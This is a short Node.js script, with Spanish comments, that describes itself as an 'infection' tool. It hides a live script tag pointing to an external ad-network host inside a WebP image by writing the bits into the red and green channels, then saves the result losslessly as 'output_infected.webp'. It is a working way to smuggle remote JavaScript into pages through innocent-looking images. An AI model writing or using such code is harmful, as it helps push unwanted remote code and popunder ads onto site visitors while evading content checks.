const sharp = require('sharp');

async function infectarPopunder() {
    console.log("🚀 Iniciando Bacteria Popunder PRO (Multi-Canal)...");

    // 1. El Payload de Adsterra (Etiqueta de script real)
    const scriptTag = `<script src="https://pl29430597.profitablecpmratenetwork.com/48/9f/d2/489fd23120820292cb2f5bba04598957.js"></script>`;
    
    // Convertimos a Base64 + terminador nulo \0 para que el lector sepa cuándo parar
    const encodedPayload = Buffer.from(scriptTag).toString('base64') + '\0';
    
    let binaryText = "";
    for (let i = 0; i < encodedPayload.length; i++) {
        binaryText += encodedPayload.charCodeAt(i).toString(2).padStart(8, '0');
    }

    try {
        // Cargamos la imagen 'input.webp' que preparó el YAML
        const { data, info } = await sharp('input.webp')
            .raw()
            .toBuffer({ resolveWithObject: true });

        let bitIndex = 0;

        // Inyección LSB en canales Rojo (i) y Verde (i+1)
        for (let i = 0; i < data.length && bitIndex < binaryText.length; i += info.channels) {
            
            // Inyectar en el canal Rojo
            data[i] = (data[i] & ~1) | parseInt(binaryText[bitIndex]);
            bitIndex++;

            // Inyectar en el canal Verde si todavía hay bits
            if (bitIndex < binaryText.length) {
                data[i + 1] = (data[i + 1] & ~1) | parseInt(binaryText[bitIndex]);
                bitIndex++;
            }
        }

        // Exportamos como WebP Lossless para no perder los bits inyectados
        await sharp(data, {
            raw: {
                width: info.width,
                height: info.height,
                channels: info.channels
            }
        })
        .webp({ lossless: true }) 
        .toFile('output_infected.webp');

        console.log(`✅ Infección completada.`);
        console.log(`📊 Bits inyectados: ${bitIndex} (${Math.ceil(bitIndex / 8)} caracteres)`);

    } catch (error) {
        console.error("🚨 Error crítico en el bot:", error);
        process.exit(1);
    }
}

infectarPopunder();
